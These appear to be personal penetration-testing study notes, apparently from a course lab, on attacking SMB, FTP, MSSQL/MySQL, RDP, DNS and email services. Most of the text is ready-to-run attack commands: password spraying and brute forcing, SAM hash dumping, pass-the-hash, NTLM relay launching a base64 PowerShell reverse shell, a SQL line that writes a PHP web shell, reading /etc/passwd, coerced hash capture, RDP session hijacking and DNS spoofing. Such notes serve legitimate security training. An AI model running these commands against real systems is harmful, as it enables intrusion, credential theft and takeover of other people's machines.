## Server Message Block (SMB)

#### mounting a share in win

```cmd-session
net use n: \\192.168.220.129\Finance
```

> [!NOTE]
> mounting with creds
> ```cmd-session
net use n: \\192.168.220.129\Finance /user:plaintext Password123

#### amount of files within share

```cmd-session
dir n: /a-d /s /b | find /c ":\"
```


|**Syntax**|**Description**|
|---|---|
|`dir`|Application|
|`n:`|Directory or drive to search|
|`/a-d`|`/a` is the attribute and `-d` means not directories|
|`/s`|Displays files in a specified directory and all subdirectories|
|`/b`|Uses bare format (no heading information or summary)|

If we want to search for a specific word within a text file, we can use [findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr).

```cmd-session
findstr /s /i cred n:\*.*
```


### Windows PowerShell

```powershell-session
 Get-ChildItem \\192.168.220.129\Finance\
```

##### mounting in powershell

```powershell-session
New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"
```

>[!NOTE]
>If we need credentials we have to make a PSCredential object e.g:
>```powershell-session
PS C:\htb> $username = 'plaintext'
PS C:\htb> $password = 'Password123'
PS C:\htb> $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\htb> $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred

GEt items in the mounted share
```powershell-session
PS C:\htb> N:
PS N:\> (Get-ChildItem -File -Recurse | Measure-Object).Count
```

We can use the property `-Include` to find specific items from the directory specified by the Path parameter.

```powershell-session
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
```

The `Select-String` cmdlet uses regular expression matching to search for text patterns in input strings and files. We can use `Select-String` similar to `grep` in UNIX or `findstr.exe` in Windows.

```powershell-session
Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
```

### Linux

Linux (UNIX) machines can also be used to browse and mount SMB shares.

##### Linux - Mount
```shell
sudo mkdir /mnt/Finance

sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
```

As an alternative, we can use a credential file.

```shell
mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
```

The file `credentialfile` has to be structured like this:

```txt
username=plaintext
password=Password123
domain=.
```

>[!NOTE]
>Requirments -> cifs-utils (sudo apt install cifs-utils)

#### Linux - Find

```shell
find /mnt/Finance/ -name *cred*
```

## Other Services

#### Linux - Install Evolution -> MAIL

```shell
sudo apt-get install evolution
```

https://wiki.gnome.org/Apps/Evolution

#### Databases


| `1.` | Command Line Utilities (`mysql` or `sqsh`)                                                                       |
| ---- | ---------------------------------------------------------------------------------------------------------------- |
| `2.` | Programming Languages                                                                                            |
| `3.` | A GUI application to interact with databases such as HeidiSQL, MySQL Workbench, or SQL Server Management Studio. |

![[Pasted image 20250203084857.png]]
LINUX

```shell
sqsh -S 10.129.20.13 -U username -P Password123
```

WINS

```cmd
sqlcmd -S 10.129.20.13 -U username -P Password123
```

To learn more about `sqlcmd` usage, you can see [Microsoft documentation](https://docs.microsoft.com/en-us/sql/ssms/scripting/sqlcmd-use-the-utility).


#### MySQL

```shell
mysql -u username -pPassword123 -h 10.129.20.13
```

#### GUI Application
https://dev.mysql.com/downloads/workbench/ -> mysql

https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver16 -> mssql

dbeaver -> multiplatform tool for databases on linux macos wins (MSSQL, MySQL, PostgreSQL)
[https://github.com/dbeaver/dbeaver/releases](https://github.com/dbeaver/dbeaver/releases)

#### Connecting to MSSQL DB using dbeaver
https://www.youtube.com/watch?v=gU6iQP5rFMw


#### Tools

| **SMB**                                                                                  | **FTP**                                     | **Email**                                          | **Databases**                                                                                                                |
| ---------------------------------------------------------------------------------------- | ------------------------------------------- | -------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)          | [ftp](https://linux.die.net/man/1/ftp)      | [Thunderbird](https://www.thunderbird.net/en-US/)  | [mssql-cli](https://github.com/dbcli/mssql-cli)                                                                              |
| [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)                              | [lftp](https://lftp.yar.ru/)                | [Claws](https://www.claws-mail.org/)               | [mycli](https://github.com/dbcli/mycli)                                                                                      |
| [SMBMap](https://github.com/ShawnDEvans/smbmap)                                          | [ncftp](https://www.ncftp.com/)             | [Geary](https://wiki.gnome.org/Apps/Geary)         | [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)                             |
| [Impacket](https://github.com/SecureAuthCorp/impacket)                                   | [filezilla](https://filezilla-project.org/) | [MailSpring](https://getmailspring.com/)           | [dbeaver](https://github.com/dbeaver/dbeaver)                                                                                |
| [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)   | [crossftp](http://www.crossftp.com/)        | [mutt](http://www.mutt.org/)                       | [MySQL Workbench](https://dev.mysql.com/downloads/workbench/)                                                                |
| [smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) |                                             | [mailutils](https://mailutils.org/)                | [SQL Server Management Studio or SSMS](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms) |
|                                                                                          |                                             | [sendEmail](https://github.com/mogaal/sendemail)   |                                                                                                                              |
|                                                                                          |                                             | [swaks](http://www.jetmore.org/john/code/swaks/)   |                                                                                                                              |
|                                                                                          |                                             | [sendmail](https://en.wikipedia.org/wiki/Sendmail) |                                                                                                                              |
#### The Concept of Attacks

![[Pasted image 20250203090234.png]]

##### LOG4J

![[Pasted image 20250203104106.png]]


# Service Misconfigurations

- anonymous authentication
- Misconfiged accesss rights
	- users with too many prvileges
	- rbac or acls


### Unnnecessary Defaults

- intial configs include too many features, settings, and creds

> [!example]
> - Unnecessary features are enabled or installed (e.g., unnecessary ports, services, pages, accounts, or privileges).
> - Default accounts and their passwords are still enabled and unchanged.
> - Error handling reveals stack traces or other overly informative error messages to users.
> - For upgraded systems, the latest security features are disabled or not configured securely.

- Admin interfaces should be disabled.
- Debugging is turned off.
- Disable the use of default usernames and passwords.
- Set up the server to prevent unauthorized access, directory listing, and other issues.
- Run scans and audits regularly to help discover future misconfigurations or missing fixes.

Sensitive information may include, but is not limited to:

- Usernames.
- Email Addresses.
- Passwords.
- DNS records.
- IP Addresses.
- Source code.
- Configuration files.
- PII.

# Attacking FTP

## Enumeration

```shell
sudo nmap -sC -sV -p 21 192.168.2.142 
```

connect to ftp
```shell
ftp 192.168.2.142 
```

#### Protocol Specifics Attacks

##### Brute Forcing

```shell
medusa -u <user> -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
```

#### FTP Bounce Attack

```shell
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

## Latest FTP vulns

 [CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836)

This vulnerability is for an FTP service that does not correctly process the `HTTP PUT` request and leads to an `authenticated directory`/`path traversal,` and `arbitrary file write` vulnerability.

#### CoreFTP Exploitation

```shell-session
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

We create a raw HTTP `PUT` request (`-X PUT`) with basic auth (`--basic -u <username>:<password>`), the path for the file (`--path-as-is https://<IP>/../../../../../whoops`), and its content (`--data-binary "PoC."`) with this command. Additionally, we specify the host header (`-H "Host: <IP>"`) with the IP address of our target system.


## Attacking SMB

### ENUM
```shell
sudo nmap 10.129.14.128 -sV -sC -p139,445
```

>[!important]
>SMB can be configured not to require authentication, which is often called a `null session`.

```shell
smbclient -N -L //10.129.14.128
```

```shell
smbmap -H 10.129.14.128
```

##### download/upload with smbmap

```shell
smbmap -H 10.129.14.128 --download "notes\note.txt"
```

```shell
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

#### rpcclient

```shell
rpcclient -U'%' 10.10.110.17
```

### inital access

```shell
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

#### RCE

- [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Python PsExec like functionality example using [RemComSvc](https://github.com/kavika13/RemCom).
- [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) - A similar approach to PsExec without using [RemComSvc](https://github.com/kavika13/RemCom). The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.

>impacket
```shell
impacket-psexec administrator:'Password123!'@10.10.110.17
```

CME

```shell
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

#### Enumerating Logged-on Users

```shell
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

#### Extract Hashes from SAM Database

```shell
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

#### Pass-the-Hash (PtH)

```shell
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```


#### Forced Authentication Attacks

We can also abuse the SMB protocol by creating a fake SMB Server to capture users' [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4).

If we cannot crack the hash, we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). Let us see an example using `impacket-ntlmrelayx`.

First, we need to set SMB to `OFF` in our responder configuration file (`/etc/responder/Responder.conf`).

```shell
 cat /etc/responder/Responder.conf | grep 'SMB ='
```

```shell
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

We can create a PowerShell reverse shell using [https://www.revshells.com/](https://www.revshells.com/), set our machine IP address, port, and the option Powershell #3 (Base64).

```shell
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e base64blob'
```


## LATEST SMB VULNS

SMBGhost



# Attacking SQL databased

## Enumeration

By default, MSSQL uses ports `TCP/1433` and `UDP/1434`, and MySQL uses `TCP/3306`. However, when MSSQL operates in a "hidden" mode, it uses the `TCP/2433` port.

## Authentication Mechanisms

`MSSQL` supports two [authentication modes](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server), which means that users can be created in Windows or the SQL Server:

|**Authentication Type**|**Description**|
|---|---|
|`Windows authentication mode`|This is the default, often referred to as `integrated` security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.|
|`Mixed mode`|Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.|

#### MySQL - Connecting to the SQL Server

```shell
 mysql -u julio -pPassword123 -h 10.129.20.13
```

```cmd
qlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

MSSQL

```shell
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

OR

```shell
mssqlclient.py -p 1433 julio@10.129.203.7 
```

>[!NOTE]
>when we authenticate to MSSQL using `sqsh` we can use the parameters `-h` to disable headers and footers for a cleaner look.

## Execute Commands

```cmd-session
1> xp_cmdshell 'whoami'
2> GO
```


## Write Local Files

```shell
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

In the following example, we can see the `secure_file_priv` variable is empty, which means we can read and write data using `MySQL`:

```shell-session
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
```

#### MySQL - Read Local Files in MySQL

```shell
select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```

## Capture MSSQL Service Hash

To make this work, we need first to start [Responder](https://github.com/lgandx/Responder) or [impacket-smbserver](https://github.com/SecureAuthCorp/impacket) and execute one of the following SQL queries:

```cmd-session
EXEC master..xp_dirtree '\\10.10.110.17\share\'
```

```cmd-session
EXEC master..xp_subdirs '\\10.10.110.17\share\'
```

## Impersonate Existing Users with MSSQL

#### Identify Users that We Can Impersonate
```cmd
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

```

```cmd-session
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
```

>[!note]
> It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using `USE master`.

## Communicate with Other Databases with MSSQL

#### Identify linked Servers in MSSQL

```cmd-session
> SELECT srvname, isremote FROM sysservers
2> GO
```

```cmd-session
> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO
```

>[!note]
> The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers

### Attacking rdp

By default, RDP uses port `TCP/3389`.

```shell
nmap -Pn -p3389 <ip>
```
#### Misconfigurations

Using the [Crowbar](https://github.com/galkan/crowbar) tool, we can perform a password spraying attack against the RDP service

```shell
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

We can also use `Hydra` to perform an RDP password spray attack.
```shell
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

Impersonating users
- need SYSTEM privs
![[Pasted image 20250207130824.png]]
```cmd
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

```cmd
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```
To run the command, we can start the `sessionhijack` service :
```cmd-session
 net start sessionhijack
```

>[!note]
>This method no longer works on Server 2019._

### PtH for rdp
Restricted Admin Mode
>This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`. It can be done using the following command:

```cmd
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

# Latest RDP Vulnerabilities

[CVE-2019-0708](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708) -> BlueKeep

>[!note]
> This is a flaw that we will likely run into during our penetration tests, but it can cause system instability, including a "blue screen of death (BSoD)," and we should be careful before using the associated exploit. If in doubt, it's best to first speak with our client so they understand the risks and then decide if they would like us to run the exploit or not.

# Attacking DNS

## Enumeration

```shell
nmap -p53 -Pn -sV -sC 10.10.110.213
```

## DNS Zone Transfer

```shell
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
```

Tools like [Fierce](https://github.com/mschwager/fierce) can also be used to enumerate all DNS servers of the root domain and scan for a DNS zone transfer:

```shell
fierce --domain zonetransfer.me
```

## Domain Takeovers & Subdomain Enumeration
`Domain takeover` is registering a non-existent domain name to gain control over another domain.

##### subdomain takeover

Suppose the `anotherdomain.com` expires and is available for anyone to claim the domain since the `target.com`'s DNS server has the `CNAME` record. In that case, anyone who registers `anotherdomain.com` will have complete control over `sub.target.com` until the DNS record is updated.

#### Subdomain Enumeration
 [Subfinder](https://github.com/projectdiscovery/subfinder)

https://dnsdumpster.com/developer/

 Other tools like [Sublist3r](https://github.com/aboul3la/Sublist3r) can also be used to brute-force subdomains by supplying a pre-generated wordlist:
```shell-session
./subfinder -d inlanefreight.com -v   
```

An excellent alternative is a tool called [Subbrute](https://github.com/TheRook/subbrute).

```shell
git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
cd subbrute
echo "ns1.inlanefreight.com" > ./resolvers.txt
./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt
```

 Using the `nslookup` or `host` command, we can enumerate the `CNAME` records for those subdomains.
>[!example]
>The `support` subdomain has an alias record pointing to an AWS S3 bucket. However, the URL `https://support.inlanefreight.com` shows a `NoSuchBucket` error indicating that the subdomain is potentially vulnerable to a subdomain takeover. Now, we can take over the subdomain by creating an AWS S3 bucket with the same subdomain name.

https://github.com/EdOverflow/can-i-take-over-xyz

It shows whether the target services are vulnerable to a subdomain takeover and provides guidelines on assessing the vulnerability.

## DNS Spoofing

 [Ettercap](https://www.ettercap-project.org/) or [Bettercap](https://www.bettercap.org/).

To exploit the DNS cache poisoning via `Ettercap`, we should first edit the `/etc/ettercap/etter.dns` file to map the target domain name (e.g., `inlanefreight.com`) that they want to spoof and the attacker's IP address (e.g., `192.168.225.110`)

```shell
cat /etc/ettercap/etter.dns
```

Next, start the `Ettercap` tool and scan for live hosts within the network by navigating to `Hosts > Scan for Hosts`. Once completed, add the target IP address (e.g., `192.168.152.129`) to Target1 and add a default gateway IP (e.g., `192.168.152.2`) to Target2.

Activate `dns_spoof` attack by navigating to `Plugins > Manage Plugins`. This sends the target machine with fake DNS responses that will resolve `inlanefreight.com` to IP address `192.168.225.110`

After a successful DNS spoof attack, if a victim user coming from the target machine `192.168.152.129` visits the `inlanefreight.com` domain on a web browser, they will be redirected to a `Fake page` that is hosted on IP address `192.168.225.110`
![[Pasted image 20250207135656.png]]

```cmd-session
ping inlanefreight.com

Pinging inlanefreight.com [192.168.225.110] with 32 bytes of data:
Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
```

# Attacking Email Services

![[Pasted image 20250207142733.png]]
## Enumeration

```shell
dig mx <domain> | grep "MX" | grep -v ";"
```

### a record of the mail server from above
```shell
dig a mail.<domain>
```

| **Port**  | **Service**                                                                |
| --------- | -------------------------------------------------------------------------- |
| `TCP/25`  | SMTP Unencrypted                                                           |
| `TCP/143` | IMAP4 Unencrypted                                                          |
| `TCP/110` | POP3 Unencrypted                                                           |
| `TCP/465` | SMTP Encrypted                                                             |
| `TCP/587` | SMTP Encrypted/[STARTTLS](https://en.wikipedia.org/wiki/Opportunistic_TLS) |
| `TCP/993` | IMAP4 Encrypted                                                            |
| `TCP/995` | POP3 Encrypted                                                             |
|           |                                                                            |

```shell
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
```

## Misconfigurations

#### Authentication

enumerate valid usernames `VRFY`, `EXPN`, and `RCPT TO`

```shell
 telnet 10.10.110.20 25

VRFY root

252 2.0.0 root


VRFY www-data

252 2.0.0 www-data


VRFY new-user

550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table

```

**`EXPN`** is similar to `VRFY`, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the `VRFY` command since sites often have an alias such as "all."

```shell
telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


EXPN john

250 2.1.0 john@inlanefreight.htb


EXPN support-team

250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```

To automate our enumeration process, we can use a tool named [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum)
```shell
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

## Cloud Enumeration

https://github.com/0xZDH/o365spray

```shell
python3 o365spray.py --validate --domain msplaintext.xyz
```

```shell
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz 

```

## Password Attacks

```shell
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```



>[!important]
>If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like `Hydra`, but these tools are usually blocked. We can instead try to use custom tools such as [o365spray](https://github.com/0xZDH/o365spray) or [MailSniper](https://github.com/dafthack/MailSniper) for Microsoft Office 365 or [CredKing](https://github.com/ustayready/CredKing) for Gmail or Okta.

#### O365 Spray - Password Spraying

```shell
 python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

## Protocol Specifics Attacks

```shell
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```

## POP3 Commands with Description

Here are the basic POP3 commands, that you can use to manage your incoming Email.

| Command                | Description                                                               | Example                                                                                       |
| ---------------------- | ------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------- |
| USER [username]        | 1st login command                                                         | USER Stan  <br>+OK Please enter a password                                                    |
| PASS [password]        | 2nd login command                                                         | PASS SeCrEt  <br>+OK valid logon                                                              |
| QUIT                   | Logs out and saves any changes                                            | QUIT  <br>+OK Bye-bye.                                                                        |
| STAT                   | Returns total number of messages and total size                           | STAT  <br>+OK 2 320                                                                           |
| LIST                   | Lists all messages                                                        | LIST  <br>+OK 2 messages (320 octets)  <br>1 120  <br>2 200  <br>…  <br>LIST 2  <br>+OK 2 200 |
| RETR [message]         | Retrieves the whole message                                               | RETR 1  <br>+OK 120 octets follow.  <br>***                                                   |
| DELE [message]         | Deletes the specified message                                             | DELE 2  <br>+OK message deleted                                                               |
| NOOP                   | The POP3 server does nothing, it merely replies with a positive response. | NOOP  <br>+OK                                                                                 |
| RSET                   | Undelete the message if any marked for deletion                           | RSET  <br>+OK maildrop has 2 messages (320 octets)                                            |
| TOP [message] [number] | Returns the headers and number of lines from the message                  | TOP 1 10  <br>+OK  <br>***                                                                    |
|                        |                                                                           |                                                                                               |

# Latest Email Service Vulnerabilities

 1. [OpenSMTPD](https://www.opensmtpd.org/) up to version 6.6.2
 2. [CVE-2020-7247](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247) and leads to RCE.
https://www.exploit-db.com/exploits/47984

